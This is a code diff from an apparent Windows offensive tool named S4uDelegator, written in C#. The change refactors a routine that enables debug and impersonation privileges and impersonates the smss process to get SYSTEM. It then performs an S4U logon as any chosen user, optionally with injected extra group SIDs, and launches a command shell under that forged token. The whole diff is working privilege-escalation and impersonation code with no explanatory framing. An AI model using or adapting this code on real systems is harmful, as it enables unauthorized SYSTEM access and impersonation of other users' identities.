@@ -14,12 +14,17 @@ namespace S4uDelegator.Library
             string sid,
             string[] extraSids)
         {
+            bool isImpersonated;
             List<string> groupSids;
+            var requiredPrivs = new List<string>
+            {
+                Win32Consts.SE_TCB_NAME,
+                Win32Consts.SE_ASSIGNPRIMARYTOKEN_NAME
+            };
+            var status = false;
 
             if (string.IsNullOrEmpty(domain))
                 domain = Environment.MachineName;
-
-            Console.WriteLine();
 
             if (!VerifyAccount(
                 ref domain,
@@ -27,6 +32,7 @@ namespace S4uDelegator.Library
                 ref sid,
                 out string upn))
             {
+                Console.WriteLine("[-] Invalid account is specified.");
                 return false;
             }
 
@@ -34,8 +40,6 @@ namespace S4uDelegator.Library
                 groupSids = VerifyGroupSids(extraSids);
             else
                 groupSids = new List<string>();
-
-            Console.WriteLine("[>] Trying to get SYSTEM.");
 
             if (!Utilities.EnableTokenPrivileges(
                 new List<string> { Win32Consts.SE_DEBUG_NAME, Win32Consts.SE_IMPERSONATE_NAME },
@@ -50,83 +54,130 @@ namespace S4uDelegator.Library
                 return false;
             }
 
-            if (!Utilities.ImpersonateAsSmss(
-                new List<string>
-                {
-                    Win32Consts.SE_TCB_NAME,
-                    Win32Consts.SE_ASSIGNPRIMARYTOKEN_NAME}
-                ))
+            do
             {
-                foreach (var priv in adjustedPrivs)
+                int error;
+                IntPtr hImpersonationToken;
+                LSA_STRING pkgName;
+                TOKEN_SOURCE tokenSource;
+                var hPrimaryToken = IntPtr.Zero;
+                var startupInfo = new STARTUPINFO
                 {
-                    if (!priv.Value)
-                        Console.WriteLine("[-] Failed to enable {0}", priv.Key);
+                    cb = Marshal.SizeOf(typeof(STARTUPINFO)),
+                    lpDesktop = @"Winsta0\Default"
+                };
+
+                Console.WriteLine("[>] Trying to get SYSTEM.");
+
+                isImpersonated = Utilities.ImpersonateAsSmss(requiredPrivs);
+
+                if (!isImpersonated)
+                {
+                    foreach (var priv in adjustedPrivs)
+                    {
+                        if (!priv.Value)
+                            Console.WriteLine("[-] Failed to enable {0}", priv.Key);
+                    }
+
+                    break;
+                }
+                else
+                {
+                    Console.WriteLine("[+] Got SYSTEM privileges.");
                 }
 
-                return false;
-            }
+                Console.WriteLine("[>] Trying to S4U logon.");
 
-            int error;
-            bool status;
-            IntPtr hImpersonationToken;
-            IntPtr hPrimaryToken;
-            LSA_STRING pkgName;
-            TOKEN_SOURCE tokenSource;
+                if (string.IsNullOrEmpty(upn))
+                {
+                    pkgName = new LSA_STRING(Win32Consts.MSV1_0_PACKAGE_NAME);
+                    tokenSource = new TOKEN_SOURCE("User32");
+                    hPrimaryToken = Utilities.GetS4uLogonToken(
+                        username,
+                        domain,
+                        in pkgName,
+                        in tokenSource,
+                        groupSids);
+                }
+                else
+                {
+                    pkgName = new LSA_STRING(Win32Consts.NEGOSSP_NAME_A);
+                    tokenSource = new TOKEN_SOURCE("NtLmSsp");
+                    hImpersonationToken = Utilities.GetS4uLogonToken(
+                        username,
+                        domain,
+                        in pkgName,
+                        in tokenSource,
+                        groupSids);
 
-            if (string.IsNullOrEmpty(upn))
-            {
-                pkgName = new LSA_STRING(Win32Consts.MSV1_0_PACKAGE_NAME);
-                tokenSource = new TOKEN_SOURCE("User32");
-                hPrimaryToken = Utilities.GetS4uLogonToken(
-                    username,
-                    domain,
-                    in pkgName,
-                    in tokenSource,
-                    groupSids);
-            }
-            else
-            {
-                pkgName = new LSA_STRING(Win32Consts.NEGOSSP_NAME_A);
-                tokenSource = new TOKEN_SOURCE("NtLmSsp");
-                hImpersonationToken = Utilities.GetS4uLogonToken(
-                    username,
-                    domain,
-                    in pkgName,
-                    in tokenSource,
-                    groupSids);
+                    if (hImpersonationToken == IntPtr.Zero)
+                    {
+                        error = Marshal.GetLastWin32Error();
+                        Console.WriteLine("[-] Failed to S4U logon.");
+                        Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
+                    }
+                    else
+                    {
+                        status = NativeMethods.DuplicateTokenEx(
+                            hImpersonationToken,
+                            TokenAccessFlags.TOKEN_ALL_ACCESS,
+                            IntPtr.Zero,
+                            SECURITY_IMPERSONATION_LEVEL.Anonymous,
+                            TOKEN_TYPE.TokenPrimary,
+                            out hPrimaryToken);
+                        NativeMethods.NtClose(hImpersonationToken);
 
-                if (hImpersonationToken == IntPtr.Zero)
-                    return false;
+                        if (!status)
+                            hPrimaryToken = IntPtr.Zero;
+                    }
+                }
 
-                status = NativeMethods.DuplicateTokenEx(
-                    hImpersonationToken,
-                    TokenAccessFlags.TOKEN_ALL_ACCESS,
+                if (hPrimaryToken == IntPtr.Zero)
+                {
+                    error = Marshal.GetLastWin32Error();
+                    Console.WriteLine("[-] Failed to S4U logon.");
+                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
+                    break;
+                }
+                else
+                {
+                    Console.WriteLine("[+] S4U logon is successful.");
+                }
+                
+                Console.WriteLine("[>] Trying to create a token assigned process.");
+
+                status = NativeMethods.CreateProcessAsUser(
+                    hPrimaryToken,
+                    null,
+                    Environment.GetEnvironmentVariable("COMSPEC"),
                     IntPtr.Zero,
-                    SECURITY_IMPERSONATION_LEVEL.Anonymous,
-                    TOKEN_TYPE.TokenPrimary,
-                    out hPrimaryToken);
+                    IntPtr.Zero,
+                    false,
+                    ProcessCreationFlags.CREATE_BREAKAWAY_FROM_JOB,
+                    IntPtr.Zero,
+                    Environment.CurrentDirectory,
+                    in startupInfo,
+                    out PROCESS_INFORMATION processInformation);
+                NativeMethods.NtClose(hPrimaryToken);
 
-                NativeMethods.NtClose(hImpersonationToken);
-
-                if (!status)
+                if (status)
+                {
+                    NativeMethods.WaitForSingleObject(processInformation.hProcess, uint.MaxValue);
+                    NativeMethods.NtClose(processInformation.hThread);
+                    NativeMethods.NtClose(processInformation.hProcess);
+                }
+                else
                 {
                     error = Marshal.GetLastWin32Error();
                     Console.WriteLine("[-] Failed to create primary token.");
-                    Console.WriteLine("    |-> {0}\n", Helpers.GetWin32ErrorMessage(error, false));
-
-                    return false;
+                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                 }
-            }
+            } while (false);
 
-            if (hPrimaryToken == IntPtr.Zero)
-                return false;
+            if (isImpersonated)
+                NativeMethods.RevertToSelf();
 
-            Console.WriteLine("[>] Trying to create a token assigned process.\n");
-            status = Utilities.CreateTokenAssignedProcess(
-                hPrimaryToken,
-                @"C:\Windows\System32\cmd.exe");
-
-            NativeMethods.NtClose(hPrimaryToken);
+            Console.WriteLine("[*] Done.");
 
             return status;
         }
